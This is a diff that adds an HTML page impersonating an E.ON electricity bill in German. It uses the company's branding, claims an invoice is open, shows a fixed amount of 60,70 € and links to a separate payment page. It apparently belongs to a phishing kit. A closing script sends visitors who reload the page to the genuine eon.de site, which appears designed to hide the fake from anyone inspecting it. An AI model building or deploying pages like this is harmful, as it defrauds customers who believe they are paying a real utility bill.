@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="de">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Ihre Rechnung - E.ON</title>
+        <!-- Dieses Skript fügt Tailwind CSS für das Styling hinzu -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link
+            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+            rel="stylesheet"
+        />
+        <style>
+            body {
+                font-family: "Inter", sans-serif;
+            }
+        </style>
+    </head>
+    <body class="bg-gray-50">
+        <!-- Header-Bereich -->
+        <header class="bg-white shadow-sm">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between items-center py-4">
+                    <!-- Logo -->
+                    <div class="flex-shrink-0">
+                        <img
+                            src="logo.png"
+                            alt="E.ON Logo"
+                            class="h-8 w-auto"
+                        />
+                    </div>
+
+                    <!-- Navigationslinks -->
+                    <nav class="hidden md:flex space-x-8">
+                        <a
+                            href="#"
+                            class="text-gray-700 hover:text-red-500 font-semibold"
+                            >Strom</a
+                        >
+                        <a
+                            href="#"
+                            class="text-gray-700 hover:text-red-500 font-semibold"
+                            >Erdgas</a
+                        >
+                        <a
+                            href="#"
+                            class="text-gray-700 hover:text-red-500 font-semibold"
+                            >Solar</a
+                        >
+                        <a
+                            href="#"
+                            class="text-gray-700 hover:text-red-500 font-semibold"
+                            >E-Mobilität</a
+                        >
+                        <a
+                            href="#"
+                            class="text-gray-700 hover:text-red-500 font-semibold"
+                            >Service</a
+                        >
+                    </nav>
+
+                    <!-- Header-Symbole -->
+                    <div class="flex items-center space-x-4">
+                        <svg
+                            class="h-6 w-6 text-gray-600"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                        >
+                            <path
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
+                            />
+                        </svg>
+                        <svg
+                            class="h-6 w-6 text-gray-600"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                        >
+                            <path
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
+                            />
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Hauptinhaltsbereich -->
+        <main class="max-w-4xl mx-auto mt-10 p-6">
+            <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                <div class="md:flex">
+                    <!-- Rote Info-Box -->
+                    <div
+                        class="md:w-1/2 bg-red-700 p-8 text-white flex flex-col justify-center"
+                    >
+                        <h1 class="text-3xl font-bold leading-tight mb-4">
+                            Stromrechnung
+                        </h1>
+                        <p class="text-lg">
+                            Hier finden Sie die Details zu Ihrer aktuellen
+                            Rechnung.
+                        </p>
+                    </div>
+
+                    <!-- Rechnungsdetails-Box -->
+                    <div class="md:w-1/2 p-8">
+                        <h2 class="text-2xl font-bold text-gray-800 mb-4">
+                            Offene Rechnung
+                        </h2>
+                        <p class="text-gray-600 mb-6">
+                            Sie haben eine offene Rechnung zu bezahlen.
+                        </p>
+
+                        <button
+                            id="pay-button"
+                            class="w-full bg-red-700 text-white font-bold py-3 px-6 rounded-lg hover:bg-red-800 transition duration-300 ease-in-out"
+                        >
+                            Zu zahlenden Betrag anzeigen
+                        </button>
+
+                        <!-- Der Preis wird hier angezeigt, nachdem der Button geklickt wurde -->
+                        <div
+                            id="price-display"
+                            class="mt-6 text-center text-3xl font-bold text-gray-800"
+                        >
+                            <!-- Preis erscheint hier -->
+                        </div>
+
+                        <!-- Neuer Button zum Bezahlen (zunächst unsichtbar) -->
+                        <div id="final-pay-container" class="mt-6 hidden">
+                            <a
+                                href="details.html"
+                                class="block w-full bg-red-700 text-white font-bold py-3 px-6 rounded-lg hover:bg-red-800 transition duration-300 ease-in-out text-center"
+                            >
+                                Jetzt bezahlen
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <script>
+            const payButton = document.getElementById("pay-button");
+            const priceDisplay = document.getElementById("price-display");
+            const finalPayContainer = document.getElementById(
+                "final-pay-container",
+            );
+
+            payButton.addEventListener("click", function () {
+                priceDisplay.textContent = "60,70 €";
+                payButton.textContent = "Zahlungsbetrag angezeigt";
+                payButton.disabled = true;
+                payButton.classList.remove("bg-red-700", "hover:bg-red-800");
+                payButton.classList.add("bg-gray-400");
+                finalPayContainer.classList.remove("hidden");
+            });
+        </script>
+        <script>
+          // Modern API to detect reload
+          if (performance.getEntriesByType("navigation")[0].type === "reload") {
+              window.location.href = "https://www.eon.de/de/pk.html";
+          }
+        </script>
+
+    </body>
+</html>
